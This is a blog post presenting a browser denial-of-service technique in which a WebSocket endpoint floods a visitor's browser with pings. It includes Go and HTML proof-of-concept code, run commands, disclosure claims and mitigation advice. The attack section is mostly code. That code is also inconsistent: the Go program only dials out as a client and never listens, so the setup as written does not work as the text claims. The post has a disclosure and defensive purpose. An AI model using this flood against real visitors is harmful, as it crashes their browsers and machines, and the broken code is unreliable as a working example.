---
title: WebSockets Reversed Ping of Death
published: 2025-06-09
draft: false
lang: en
description: WebSockets Reversed Ping of Death
tags: []
---

**Warning:** The following action may cause a visitor’s browser or even their computer to crash. This information is provided for educational purposes only. Use it responsibly.

I do not encourage or condone the misuse of this knowledge, and I disclaim any responsibility for any damage, disruption, or unintended consequences resulting from its use. Proceed at your own risk.

---

One of the first things someone learns in martial arts is that when you hold someone, that someone holds you too. If, for example, that someone falls on purpose while you’re holding them tightly, chances are you might fall too.

Even though there isn’t a special name for this idea, it can be found in Aiki martial arts principle, where the main point is that the opponent’s energy becomes a tool in your hands if you redirect it wisely.

When you write a program that handles WebSocket connections, one of the main security concerns is preventing a client from flooding you with messages or pings with bad intentions.

But what if I told you that, on the other side, no browser checks if someone attacks with abnormal load of WebSocket messages or pings in bad faith — and just ends up crashing?

---

You can easily test this yourself:

1. Bookmark this page first, so you can return after a crash.

2. Write a Go program that opens a WebSocket connection and continuously sends pings in a highly repetitive loop:

```go
// main.go
package main

import (
    "log"
    "github.com/gorilla/websocket"
)

func main() {
    url := "ws://localhost:3001"
    conn, _, err := websocket.DefaultDialer.Dial(url, nil)
    if err != nil {
        log.Fatal("Error connecting to WebSocket:", err)
    }
    defer conn.Close()

    for {
        err := conn.WriteMessage(websocket.PingMessage, nil)
        if err != nil {
            log.Println("Error sending ping:", err)
            return
        }
    }
}
```

3. Write an HTML page that connects to this WebSocket connection:

```html
<!-- index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>WebSocket Reversed Ping of Death</title>
</head>
<body>
    <h1>WebSocket Reversed Ping of Death</h1>

    <script>
        const socket = new WebSocket("ws://localhost:3001/ws");

        socket.onerror = (error) => {
            console.error("WebSocket error:", error);
        };

        socket.onopen = () => {
            console.log("WebSocket connected.");
        };

        socket.onclose = () => {
            console.log("WebSocket closed.");
        };

        socket.onmessage = (event) => {
            console.log("WebSocket received:", event.data);
        };
    </script>
</body>
</html>
```

4. Run the Go program:

```bash
go mod init main
go mod tidy
go run main.go
```

5. Start a simple HTTP server to serve `index.html`:
   (If port 3002 is not available, pick another one, e.g., 3003…)

```bash
python3 -m http.server 3002
```

6. Open the page in your browser. For example:
   (If port 3002 was not available, use the other port you picked)

```
http://localhost:3002
```

---

Of course, the reason I’m writing these lines is not to enable script kiddies to annoy others, but to highlight a problem and propose a solution. Just to clarify, I am publishing this article only after having contacted major browser developers and submitted bug reports to ensure better client-side security checks for everyone.

Until all browsers implement a check, you can take care of yourself, by:

* If visiting a site crashed your computer, be aware that it’s possible and that it may be just this method described above used. Don’t panic and don’t believe everything.
* If you develop an application that depends on a third-party WebSocket, then make sure that you really trust the provider of it.

---

It’s the browsers that need to protect you from such a problem since the WebSocket API of them (which is kind of the same across all of them) doesn’t expose you the pings. This means that even if you write code that may find abnormal load of messages — good, perfect — but… you will never be able to see an abnormal load of pings, as you don’t get them at all like they don’t exist.

Using a custom proxy made to bypass and check the connection could be a real solution, as a proxy being a whole program, freed from the limitations of browsers, could detect abnormal loads of everything, including pings and kill the connection if needed.

I don’t provide the code to such a thing because this is simply opening other problems like what if someone abuses your proxy, so it’s a solution that needs to be implemented carefully and maybe customized.

---

Back to browsers, it’s worth noting that there are actually two other ways to have a WebSocket connection that claim to try to solve such problems. Well, they don’t talk exactly about the problem above (especially with the ping case), but they talk about almost the same and they call it **“backpressure”**. From Mozilla Developer Network:

> **Backpressure**
> An important concept in streams is backpressure — this is the process by which a single stream or a pipe chain regulates the speed of reading/writing. When a stream later in the chain is still busy and isn't yet ready to accept more chunks, it sends a signal backwards through the chain to tell earlier transform streams (or the original source) to slow down delivery so that you don't end up with a bottleneck anywhere.

[https://developer.mozilla.org/en-US/docs/Web/API/Streams\_API/Concepts#backpressure](https://developer.mozilla.org/en-US/docs/Web/API/Streams_API/Concepts#backpressure)

Those two other ways are **WebTransport API** and **Streams API**. Both are great but very fresh, in contrast to the WebSocket API which has been around for more than a decade. They are so fresh that the first is not supported by Safari and the second is not supported by Firefox. And even the browsers that support one or the other do so only in very recent versions (and experimentally, I would guess).
